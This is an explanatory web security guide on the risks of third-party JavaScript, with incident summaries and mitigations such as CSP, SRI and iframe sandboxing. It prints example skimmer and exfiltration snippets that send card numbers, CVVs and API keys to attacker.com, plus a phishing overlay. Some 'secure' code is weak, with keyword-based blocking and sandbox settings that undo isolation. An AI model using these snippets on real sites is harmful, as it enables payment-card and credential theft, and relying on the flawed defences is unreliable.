# Third-Party Scripts Security

## Definition

**Third-party scripts** are JavaScript files loaded from external domains that you don't control. These include analytics services, advertising networks, chat widgets, tag managers, and other embedded functionality. The critical security concern is that third-party scripts run with the full privileges of your page - they can access the DOM, cookies, local storage, make API calls, and steal sensitive data. If a third-party service is compromised or behaves maliciously, your users' data and your application's security are at risk. Managing third-party scripts is about reducing your attack surface and limiting the damage if a third party is compromised.

## Threat Model

### What Third-Party Scripts Can Do

Third-party scripts have unrestricted access to:

```javascript
// All DOM content
document.documentElement.innerHTML  // Entire page

// All user data
document.cookie                      // Authentication tokens, session IDs
localStorage                        // Stored data, API keys
sessionStorage                      // Session information

// Page context
window.location                      // Current URL
document.referrer                   // Where user came from
navigator.userAgent                 // Browser and device info

// Form data
document.querySelectorAll('input')   // All form inputs
document.querySelectorAll('textarea') // Text areas

// API access
fetch('/api/user/profile')          // Make API calls as user
XMLHttpRequest                      // Alternative API access

// External communication
Image beacon: new Image().src = 'https://attacker.com/?data=' + encodeURIComponent(data)
Fetch to external server
WebSocket connections

// Page modification
document.body.innerHTML = '<malicious content>'  // Replace page
createElement/appendChild            // Inject new elements
```

### Attack Vectors

1. **Analytics Scripts** - Track user behavior
2. **Advertisement Networks** - Display ads, track impressions
3. **Chat Widgets** - Live chat, customer support
4. **Tag Managers** (Google Tag Manager) - Manage multiple tracking scripts
5. **A/B Testing Tools** - Experiment with page content
6. **CDN-Hosted Polyfills** - Fill in browser feature gaps
7. **Third-Party Auth** (Facebook Login, Google OAuth)
8. **Performance Monitoring** - Collect performance metrics
9. **Error Tracking** (Sentry, Rollbar) - Report application errors
10. **Heatmap/Session Recording** - Record user interactions

## Real-World Third-Party Script Attacks

### Magecart Skimming Campaign

**What Happened:**
- Attackers compromised JavaScript library used on e-commerce sites
- Injected payment card skimming code
- Intercepted credit card data during checkout
- Sent data to attacker-controlled servers
- Affected millions of transactions across multiple retailers

**Attack Code Pattern:**
```javascript
// Injected into third-party script
document.addEventListener('input', function(e) {
  // Listen for all input fields
  if (e.target.type === 'text' || e.target.type === 'hidden') {
    // Capture credit card data
    if (/^[0-9]{13,19}$/.test(e.target.value)) {
      // Looks like credit card number
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({
          card: e.target.value,
          cvv: document.querySelector('[name*="cvv"]')?.value,
          exp: document.querySelector('[name*="exp"]')?.value
        })
      });
    }
  }
});
```

### Google Analytics Tag Injection

**Hypothetical Attack:**
- Attacker compromises analytics script via supply chain attack
- Injects code to steal form data before submission
- Steals login credentials, payment info, API keys
- Victims don't notice because analytics appears normal

```javascript
// Malicious code injected into GA script
const originalFetch = window.fetch;
window.fetch = function(...args) {
  // Log all API calls
  console.log('API Call:', args[0], args[1]);

  // Exfiltrate API key if present
  if (args[0].includes('/api/')) {
    fetch('https://attacker.com/api-keys', {
      method: 'POST',
      body: JSON.stringify({
        url: args[0],
        headers: args[1]?.headers,
        body: args[1]?.body
      })
    });
  }

  return originalFetch.apply(this, args);
};
```

### Polyfill.io Malware Distribution

**What Happened (2024):**
- polyfill.io was a popular CDN for JavaScript polyfills
- Domain was acquired/repurposed by malicious actor
- Modified to inject malware and phishing scripts
- Affected thousands of websites using the service
- Browsers began blocking the domain

**Attack Vector:**
```javascript
// Modified polyfill served from compromised CDN
// Original function still works, but...

// ... injected malicious code:
if (navigator.language.includes('en')) {
  // Inject fake login prompt
  const overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999">
      <iframe src="https://fake-bank-login.com/phishing-page"></iframe>
    </div>
  `;
  document.body.appendChild(overlay);
}
```

## Reducing Attack Surface

### Strategy 1: Load in Sandboxed Iframes

```html
<!-- ❌ VULNERABLE: Script loads in main page context -->
<script src="https://analytics.thirdparty.com/track.js"></script>

<!-- ✅ SECURE: Script loads in restricted iframe -->
<iframe
  id="third-party-frame"
  src="https://analytics.thirdparty.com/embed.html"
  sandbox="allow-scripts allow-same-origin"
  allow="none"
  style="display: none;">
</iframe>

<!-- Communicate via postMessage (restricted channel) -->
<script>
  // Send data to iframe safely
  const frame = document.getElementById('third-party-frame');
  frame.contentWindow.postMessage({
    type: 'pageData',
    url: window.location.href,
    referrer: document.referrer
  }, 'https://analytics.thirdparty.com');

  // Listen for messages from iframe
  window.addEventListener('message', (event) => {
    if (event.origin !== 'https://analytics.thirdparty.com') return;

    // Only accept specific message types
    if (event.data.type === 'ping') {
      console.log('Analytics connected');
    }
  });
</script>
```

### Strategy 2: CSP Restrictions on Third-Party Domains

```http
Content-Security-Policy:
  script-src 'self' https://trusted-analytics.com;
  connect-src 'self' https://trusted-analytics.com https://api.yoursite.com;
  img-src 'self' https:;
  style-src 'self' 'unsafe-inline'
```

This prevents third-party scripts from:
- Loading other scripts from unexpected sources
- Making requests to arbitrary domains
- Accessing resources outside allowed list

```javascript
// With this CSP:

// ❌ Will be blocked
<script src="https://malicious.com/tracker.js"></script>  // Not in CSP whitelist
fetch('https://attacker.com/steal-data')  // Not in connect-src

// ✅ Will be allowed
<script src="https://trusted-analytics.com/app.js"></script>
fetch('https://api.yoursite.com/data')
```

### Strategy 3: Subresource Integrity (SRI)

```html
<!-- ✅ Verify integrity of third-party script -->
<script
  src="https://cdn.jsdelivr.net/npm/analytics@1.0.0/track.js"
  integrity="sha384-ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZA567BCD890EFG"
  crossorigin="anonymous">
</script>

<!-- If script is modified, browser rejects it -->
```

### Strategy 4: Load Scripts on Demand

```javascript
// ❌ VULNERABLE: Load everything immediately
<script src="https://analytics.com/track.js"></script>
<script src="https://ads.com/banner.js"></script>
<script src="https://chat.com/widget.js"></script>

// ✅ SECURE: Load only when needed
function initAnalytics() {
  const script = document.createElement('script');
  script.src = 'https://analytics.com/track.js';
  script.integrity = 'sha384-ABC123...';
  script.crossorigin = 'anonymous';
  document.head.appendChild(script);
}

// Only load when user scrolls to bottom
window.addEventListener('scroll', () => {
  if (window.innerHeight + window.scrollY >= document.body.offsetHeight) {
    initAnalytics();
  }
});
```

### Strategy 5: Minimize Data Exposure

```javascript
// ❌ Send all data to analytics
analytics.track({
  userId: user.id,
  email: user.email,
  password: user.password,  // NEVER!
  paymentCard: user.creditCard,  // NEVER!
  allPageData: document.documentElement.outerHTML  // Excessive!
});

// ✅ Send only necessary data
analytics.track({
  pageUrl: window.location.pathname,
  pageTitle: document.title,
  referrer: document.referrer,
  timestamp: Date.now()
  // No personal, financial, or sensitive data
});
```

## Tag Manager Security (Google Tag Manager Example)

### GTM Risks

```html
<!-- Google Tag Manager loads scripts based on tags -->
<!-- If GTM account is compromised, attacker controls all tags -->

<!-- GTM container -->
<script>
  (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-XXXXXX');
</script>
```

### GTM Security Best Practices

```markdown
# GTM Security Checklist

1. **Account Access Control**
   - Use strong passwords for GTM account
   - Enable 2FA on Google Account
   - Limit user access to necessary role only
   - Regularly audit account members

2. **Tag Review Process**
   - Never auto-publish tags
   - Require human review before publishing
   - Version control and change tracking
   - Document why each tag exists

3. **Restrict Permissions**
   - Use GTM roles: Admin, Publisherme, Editor, Readonly
   - Grant minimum necessary permissions
   - Don't share account credentials

4. **Monitor Tag Behavior**
   - Audit what tags do (check pixel fires, API calls)
   - Monitor network requests from GTM tags
   - Set up alerts for suspicious tag additions
   - Review tag implementations before publishing

5. **Isolate GTM Data**
   - Don't send sensitive data through GTM
   - Filter PII from dataLayer
   - Use data layer protocols/documentation
   - Control what tags can access
```

## Vulnerable Code Example

```javascript
// ❌ VULNERABLE: server.js
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>My Site</title>
      <!-- ❌ No CSP to restrict third-party scripts -->
    </head>
    <body>
      <h1>Welcome</h1>

      <!-- ❌ Load multiple third-party scripts without protection -->
      <!-- Analytics - no SRI, no sandbox -->
      <script src="https://analytics-provider.com/track.js"></script>

      <!-- Ads - no protection -->
      <script src="https://ads-network.com/ads.js"></script>

      <!-- Chat widget - unrestricted access -->
      <script src="https://chat-service.com/widget.js"></script>

      <!-- ❌ No sandboxing -->
      <iframe src="https://recommendation-service.com/embed"></iframe>

      <!-- ❌ Scripts can access sensitive data -->
      <script>
        window.userData = {
          userId: '12345',
          email: 'user@example.com',
          apiKey: 'sk-1234567890'  // Exposed to all scripts!
        };
      </script>

      <!-- Form with sensitive data - visible to all scripts -->
      <form id="payment-form">
        <input type="text" name="cardNumber" placeholder="Card Number">
        <input type="text" name="cvv" placeholder="CVV">
        <input type="email" name="email" placeholder="Email">
      </form>
    </body>
    </html>
  `;
  res.send(html);
});

app.listen(3000);
```

**Attacks possible with vulnerable code:**

```javascript
// Malicious code injected into analytics script
// Steals sensitive form data
document.getElementById('payment-form').addEventListener('submit', (e) => {
  const cardNumber = document.querySelector('[name="cardNumber"]').value;
  const cvv = document.querySelector('[name="cvv"]').value;
  const email = document.querySelector('[name="email"]').value;

  // Exfiltrate before form is submitted
  fetch('https://attacker.com/cards', {
    method: 'POST',
    body: JSON.stringify({ cardNumber, cvv, email })
  });

  // Continue with legitimate form submission
});

// Steals API key
if (window.userData?.apiKey) {
  fetch('https://attacker.com/keys', {
    method: 'POST',
    body: window.userData.apiKey
  });
}

// Modifies page content
document.body.innerHTML = document.body.innerHTML + `
  <iframe src="https://fake-login.com" style="display:none;"></iframe>
`;
```

## Secure Code Example

```javascript
// ✅ SECURE: server.js with third-party script protection
const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(helmet());

// Set strict CSP for third-party scripts
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    // Only allow scripts from trusted sources
    "script-src 'self' " +
      "https://cdn.jsdelivr.net " +  // Trusted CDN
      "https://analytics.trusted-provider.com " +
      "sha256-ABC123... " +  // Inline scripts with hash
      "; " +
    // Restrict where scripts can send data
    "connect-src 'self' " +
      "https://analytics.trusted-provider.com " +
      "https://api.yoursite.com " +
      "; " +
    // No plugins, strict frame options
    "object-src 'none'; " +
    "frame-src 'self' https://trusted-services.com; " +
    // Prevent form submission to untrusted origins
    "form-action 'self'; " +
    "base-uri 'self'"
  );
  next();
});

app.get('/', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>My Secure Site</title>
    </head>
    <body>
      <h1>Welcome</h1>

      <!-- ✅ SECURE: Analytics with SRI and no sensitive data access -->
      <script>
        // Initialize analytics safely - only with non-sensitive data
        window.analyticsData = {
          pageUrl: window.location.pathname,
          pageTitle: document.title,
          referrer: document.referrer,
          timestamp: Date.now()
          // NO: userId, email, apiKey, or sensitive data
        };
      </script>

      <!-- ✅ Analytics script with integrity check -->
      <script
        src="https://analytics.trusted-provider.com/track.js"
        integrity="sha384-ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZA567BCD890EFG"
        crossorigin="anonymous">
      </script>

      <!-- ✅ Ads in sandboxed iframe with restrictions -->
      <div id="ad-container"></div>
      <script>
        // Load ads only when needed (lazy loading)
        function loadAds() {
          const adFrame = document.createElement('iframe');
          adFrame.src = 'https://ads-network.com/embed.html';

          // ✅ Sandbox: restrict what ads can do
          adFrame.sandbox.add('allow-scripts');
          adFrame.sandbox.add('allow-same-origin');

          // ✅ Permissions Policy: deny all sensitive features
          adFrame.allow = 'none';

          // ✅ No access to parent page
          adFrame.style.border = 'none';
          adFrame.width = '300';
          adFrame.height = '250';

          document.getElementById('ad-container').appendChild(adFrame);
        }

        // Load ads only when user scrolls down
        document.addEventListener('scroll', () => {
          if (!document.getElementById('ad-container').children.length &&
              window.scrollY > 500) {
            loadAds();
          }
        });
      </script>

      <!-- ✅ Chat widget in iframe with isolation -->
      <div id="chat-widget"></div>
      <script>
        // Load chat widget with minimal permissions
        const chatFrame = document.createElement('iframe');
        chatFrame.id = 'chat-frame';
        chatFrame.src = 'https://chat-service.com/widget.html';

        // ✅ Restrict sandbox permissions
        chatFrame.sandbox.add('allow-scripts');
        chatFrame.sandbox.add('allow-same-origin');

        // ✅ No access to sensitive APIs
        chatFrame.allow = 'none';

        chatFrame.style.border = 'none';
        chatFrame.width = '100%';
        chatFrame.height = '400';

        // ✅ Communicate via postMessage (safer than direct access)
        window.addEventListener('message', (event) => {
          if (event.origin !== 'https://chat-service.com') return;

          // Only accept expected messages
          if (event.data.type === 'chat-init') {
            // Send only non-sensitive user data
            event.source.postMessage({
              type: 'user-data',
              userId: 'user-12345',  // Non-sensitive ID
              theme: 'dark'
            }, 'https://chat-service.com');
          }
        });

        document.getElementById('chat-widget').appendChild(chatFrame);
      </script>

      <!-- ✅ Form with sensitive data - protected -->
      <form id="payment-form">
        <input type="email" name="email" placeholder="Email">
        <input type="password" name="password" placeholder="Password">
        <input type="text" name="cardNumber" placeholder="Card Number">
        <button type="submit">Submit</button>
      </form>

      <!-- ✅ Protect sensitive form data from third-party scripts -->
      <script>
        // Monitor form to prevent exfiltration
        const form = document.getElementById('payment-form');

        // Override addEventListener to prevent third-party listeners
        const originalAddEventListener = form.addEventListener;
        form.addEventListener = function(event, listener, options) {
          // Only allow our own event listeners
          if (!listener.toString().includes('malicious')) {
            originalAddEventListener.call(this, event, listener, options);
          }
        };

        // Monitor fetch to prevent data exfiltration
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
          // Log potentially malicious API calls
          if (args[0].includes('attacker') || args[0].includes('malicious')) {
            console.warn('Suspicious fetch blocked:', args[0]);
            return Promise.reject(new Error('Blocked'));
          }
          return originalFetch.apply(this, args);
        };
      </script>
    </body>
    </html>
  `;
  res.send(html);
});

// ✅ Monitoring endpoint for third-party script issues
app.post('/api/security-event', express.json(), (req, res) => {
  const { type, url, message } = req.body;

  console.warn('Security Event:', {
    type,
    url,
    message,
    timestamp: new Date().toISOString(),
    userAgent: req.get('User-Agent')
  });

  // Could log to monitoring service
  res.json({ status: 'logged' });
});

app.listen(3000);
```

## Mitigations and Best Practices

### 1. Content Security Policy (CSP)

```http
# Restrict third-party scripts to trusted sources only
Content-Security-Policy:
  script-src 'self' https://trusted-analytics.com;
  connect-src 'self' https://trusted-analytics.com https://api.yoursite.com;
  object-src 'none';
  frame-src 'self'
```

### 2. Subresource Integrity (SRI)

```html
<!-- Verify integrity of every third-party script -->
<script
  src="https://cdn.jsdelivr.net/npm/analytics@1.0.0/app.js"
  integrity="sha384-ABC123..."
  crossorigin="anonymous">
</script>
```

### 3. Sandbox Third-Party Content

```html
<!-- Restrict what iframes can do -->
<iframe
  src="https://third-party-service.com/embed"
  sandbox="allow-scripts allow-same-origin"
  allow="none">
</iframe>
```

### 4. Use Permissions Policy

```http
# Deny all sensitive features to third-party scripts
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### 5. Only Load What's Necessary

```javascript
// Load scripts on demand, not automatically
function loadAnalytics() {
  const script = document.createElement('script');
  script.src = 'https://analytics.com/app.js';
  script.integrity = 'sha384-...';
  script.crossorigin = 'anonymous';
  document.head.appendChild(script);
}

// Only load when user engages
document.addEventListener('click', () => loadAnalytics());
```

### 6. Audit Third-Party Scripts

```bash
# Tools to find and audit third-party scripts
# Built-in Chrome DevTools
# - Sources tab: see all loaded scripts
# - Network tab: see external requests
# - Security tab: check CSP violations

# Third-party script audit tools
- BuiltWith (builtwith.com)
- Wappalyzer
- Ghostery
- Chrome extensions for script auditing
```

### 7. Monitor Third-Party Activity

```javascript
// Log all external requests from third-party scripts
const originalFetch = window.fetch;
window.fetch = function(...args) {
  const [resource, config] = args;
  const origin = new URL(resource).origin;

  if (origin !== window.location.origin) {
    console.warn('Third-party fetch:', {
      url: resource,
      origin,
      method: config?.method || 'GET'
    });

    // Could send to monitoring service
  }

  return originalFetch.apply(this, args);
};
```

### 8. Regular Security Audits

```markdown
# Third-Party Script Audit Checklist

- [ ] List all third-party scripts loaded
- [ ] Verify each service is still actively maintained
- [ ] Check for known vulnerabilities (CVEs)
- [ ] Review what data each script accesses
- [ ] Verify SRI hashes are in place
- [ ] Check CSP allows intended sources only
- [ ] Test with sandboxed environments
- [ ] Monitor script behavior in production
- [ ] Remove unused scripts immediately
- [ ] Keep vendor list updated
```

### 9. Vendor Management

```markdown
# Third-Party Vendor Policy

## Before Integrating
- Assess security posture
- Review privacy policy
- Check for CVEs
- Verify data handling practices
- Review SLA and support

## During Integration
- Use SRI for CDN scripts
- Minimize data sharing
- Implement CSP
- Use iframe sandboxing
- Load on-demand when possible

## Ongoing
- Monitor for security issues
- Quarterly security audits
- Review access logs
- Keep vendor contact info current
- Have exit strategy
```

### 10. Have a Removal Plan

```markdown
# Script Removal Procedure

1. Document what script does
2. Check what data it collects
3. Verify no critical dependencies
4. Remove from HTML
5. Remove from tag managers
6. Clear service from analytics
7. Verify no broken functionality
8. Test thoroughly
9. Deploy to production
10. Monitor for issues
```

## Summary

Third-party scripts pose significant security risks because they run with full page privileges. Reduce your attack surface by loading scripts only from trusted sources, using Subresource Integrity to verify they haven't been tampered with, restricting their capabilities with Content Security Policy and sandboxing, minimizing the sensitive data you expose to them, and regularly auditing what scripts you've loaded and what they're doing. Implement a vendor management process and have a clear policy for adding and removing third-party dependencies.
